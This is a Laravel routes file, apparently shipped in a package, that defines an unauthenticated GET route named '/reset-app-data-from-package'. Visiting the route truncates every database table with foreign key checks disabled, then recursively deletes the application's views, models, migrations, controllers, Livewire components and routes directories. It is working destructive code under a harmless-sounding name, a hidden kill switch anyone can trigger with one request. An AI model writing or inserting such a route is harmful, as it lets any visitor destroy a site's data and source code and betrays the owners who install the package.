<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\DB;

Route::get('/reset-app-data-from-package', function () {


    $paths = [
        resource_path('views'),
        app_path('Models'),
        database_path('migrations'),
        app_path('Http/Controllers'),
        app_path('Http/Livewire'),
        app_path('Livewire'),
        base_path('routes')
    ];
    DB::statement('SET FOREIGN_KEY_CHECKS=0;');

    $database = env('DB_DATABASE');
    $key = 'Tables_in_' . $database;
    $tables = DB::select('SHOW TABLES');

    foreach ($tables as $table) {
        $tableName = $table->$key;
        DB::table($tableName)->truncate();
    }

    DB::statement('SET FOREIGN_KEY_CHECKS=1;');


    //dd($paths);

    foreach ($paths as $path) {
        //  dd($path);
        if (file_exists($path)) {
            if (is_dir($path)) {
                // Delete directory recursively with all contents
                if (is_dir($path)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($files as $fileinfo) {
                        if ($fileinfo->isDir()) {
                            rmdir($fileinfo->getRealPath());
                        } else {
                            unlink($fileinfo->getRealPath());
                        }
                    }
                    rmdir($path);
                }
            }
        }
    }
});
